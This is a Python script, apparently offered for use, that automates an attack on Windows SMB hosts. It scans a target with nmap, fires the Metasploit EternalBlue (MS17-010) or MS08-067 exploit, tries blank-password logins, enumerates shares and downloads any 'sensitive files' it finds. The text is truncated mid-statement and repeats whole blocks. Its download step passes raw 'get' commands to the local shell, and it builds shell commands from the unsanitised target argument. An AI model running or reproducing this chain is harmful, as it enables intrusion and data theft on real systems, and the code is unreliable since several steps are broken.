# SMB vulnerability scanner and exploiter
# Usage: python smb-vuln-scan-exploit.py <target IP>

import sys
import os
import subprocess

# Check if target IP is provided
if len(sys.argv) != 2:
    print("Usage: python smb_vuln.py <target IP>")
    sys.exit(1)

# Assign target IP to a variable
target = sys.argv[1]

# Scan the target IP for SMB vulnerabilities using nmap
print("Scanning the target IP for SMB vulnerabilities...")
nmap_cmd = "nmap --script vuln -p139,445 " + target
nmap_output = subprocess.check_output(nmap_cmd, shell=True).decode()

# Check if the target is vulnerable to ms17-010
if "VULNERABLE" in nmap_output and "ms17-010" in nmap_output:
    print("The target is vulnerable to ms17-010!")
    # Exploit ms17-010 using metasploit
    print("Exploiting ms17-010 using metasploit...")
    msf_cmd = "msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS " + target + "; run; exit\""
    msf_output = subprocess.check_output(msf_cmd, shell=True).decode()
    # Check if the exploit was successful
    if "Meterpreter session" in msf_output:
        print("Exploit successful! You have a meterpreter session on the target!")
        # Prompt the user to try sign in with no password or with an empty password and check for sensitive files
        print("Do you want to try sign in with no password or with an empty password and check for sensitive files? (y/n)")
        answer = input()
        if answer.lower() == "y":
            # Try sign in with no password or with an empty password using metasploit
            print("Trying sign in with no password or with an empty password using metasploit...")
            msf_cmd = "msfconsole -q -x \"use auxiliary/scanner/smb/smb_login; set RHOSTS " + target + "; set SMBUser ''; set SMBPass ''; run; exit\""
            msf_output = subprocess.check_output(msf_cmd, shell=True).decode()
            # Check if the sign in was successful
            if "SUCCESSFUL LOGIN" in msf_output:
                print("Sign in successful! You have access to the SMB shares on the target!")
                # List the shares using metasploit
                print("Listing the shares using metasploit...")
                msf_cmd = "msfconsole -q -x \"use auxiliary/scanner/smb/smb_enumshares; set RHOSTS " + target + "; run; exit\""
                msf_output = subprocess.check_output(msf_cmd, shell=True).decode()
                # Check if any shares are found
                if "Share" in msf_output:
                    print("Shares found! Here are the share names and permissions:")
                    # Extract the share names and permissions from the output
                    shares = []
                    for line in msf_output.split("\n"):
                        if "Share" in line:
                            share = line.split()[1:]
                            shares.append(share)
                    # Print the share names and permissions
                    for share in shares:
                        print(share[0] + ": " + share[1])
                    # Check for sensitive files using metasploit
                    print("Checking for sensitive files using metasploit...")
                    msf_cmd = "msfconsole -q -x \"use auxiliary/scanner/smb/smb_enumfiles; set RHOSTS " + target + "; run; exit\""
                    msf_output = subprocess.check_output(msf_cmd, shell=True).decode()
                    # Check if any sensitive files are found
                    if "Sensitive file" in msf_output:
                        print("Sensitive files found! Here are the file paths:")
                        # Extract the file paths from the output
                        file_paths = []
                        for line in msf_output.split("\n"):
                            if "Sensitive file" in line:
                                file_path = line.split()[-1]
                                file_paths.append(file_path)
                        # Print the file paths
                        for file_path in file_paths:
                            print(file_path)
                        # Prompt the user to download the sensitive files using get command
                        print("Do you want to download the sensitive files using get command? (y/n)")
                        answer = input()
                        if answer.lower() == "y":
                            # Download the sensitive files using get command
                            print("Downloading the sensitive files using get command...")
                            for file_path in file_paths:
                                get_cmd = "get " + file_path
                                get_output = subprocess.check_output(get_cmd, shell=True).decode()
                                print(get_output)
                            print("Download complete! You have saved the sensitive files on your system!")
                        else:
                            print("Okay, not downloading the sensitive files.")
                    else:
                        print("No sensitive files found.")
                else:
                    print("No shares found.")
            else:
                print("Sign in failed! The target requires a valid username and password.")
        else:
            print("Okay, not trying sign in with no password or with an empty password.")
    else:
        print("Exploit failed! Try another payload or exploit.")
# Check if the target is vulnerable to ms08-067
elif "VULNERABLE" in nmap_output and "ms08-067" in nmap_output:
    print("The target is vulnerable to ms08-067!")
    # Exploit ms08-067 using metasploit
    print("Exploiting ms08-067 using metasploit...")
    msf_cmd = "msfconsole -q -x \"use exploit/windows/smb/ms08_067_netapi; set RHOSTS " + target + "; run; exit\""
    msf_output = subprocess.check_output(msf_cmd, shell=True).decode()
    # Check if the exploit was successful
    if "Meterpreter session" in msf_output:
        print("Exploit successful! You have a meterpreter session on the target!")
        # Prompt the user to try sign in with no password or with an empty password and check for sensitive files
        print("Do you want to try sign in with no password or with an empty password and check for sensitive files? (y/n)")
        answer = input()
        if answer.lower() == "y":
            # Try sign in with no password or with an empty password using metasploit
            print("Trying sign in with no password or with an empty password using metasploit...")
            msf_cmd = "msfconsole -q -x \"use auxiliary/scanner/smb/smb_login; set RHOSTS " + target + "; set SMBUser ''; set SMBPass ''; run; exit\""
            msf_output = subprocess.check_output(msf_cmd, shell=True).decode()
            # Check if the sign in was successful
            if "SUCCESSFUL LOGIN" in msf_output:
                print("Sign in successful! You have access to the SMB shares on the target!")
                # List the shares using metasploit
                print("Listing the shares using metasploit...")
                msf_cmd = "msfconsole -q -x \"use auxiliary/scanner/smb/smb_enumshares; set RHOSTS " + target + "; run; exit\""
                msf_output = subprocess.check_output(msf_cmd, shell=True).decode()
                # Check if any shares are found
                if "Share" in msf_output:
                    print("Shares found! Here are the share names and permissions:")
                    # Extract the share names and permissions from the output
                    shares = []
                    for line in msf_output.split("\n"):
                        if "Share" in line:
                            share = line.split()[1:]
                            shares.append(share)
                    # Print the share names and permissions
                    for share in shares:
                        print(share[0] + ": " + share[1])
                    # Check for sensitive files using metasploit
                    print("Checking for sensitive files using metasploit...")
                    msf_cmd = "msfconsole -q -x \"use auxiliary/scanner/smb/smb_enumfiles; set RHOSTS " + target + "; run; exit\""
                    msf_output = subprocess.check_output(msf_cmd, shell=True).decode()
                    # Check if any sensitive files are found
                    if "Sensitive file" in msf_output:
                        print("Sensitive files found! Here are the file paths:")
                        # Extract the file paths from the output
                        file_paths = []
                        for line in msf_output.split("\n"):
                            if "Sensitive file" in line:
                                file_path = line.split()[-1]
                                file_paths.append(file_path)
                        # Print the file paths
                        for file_path in file_paths:
                            print(file_path)
                        # Prompt the user to download the sensitive files using get command
                        print("Do you want to download the sensitive files using get command? (y/n)")
                        answer = input()
                        if answer.lower() == "y":
                            # Download the sensitive files using get command
                            print("Downloading the sensitive files using get command...")
                            for file_path in file_paths:
                                get_cmd = "get " + file_path
                                get_output = subprocess.check_output(get_cmd, shell=True).decode()
                                print(get_output)
                            print("Download complete! You have saved the sensitive files on your system!")
                        else:
                            print("Okay, not downloading the sensitive files.")
                    else
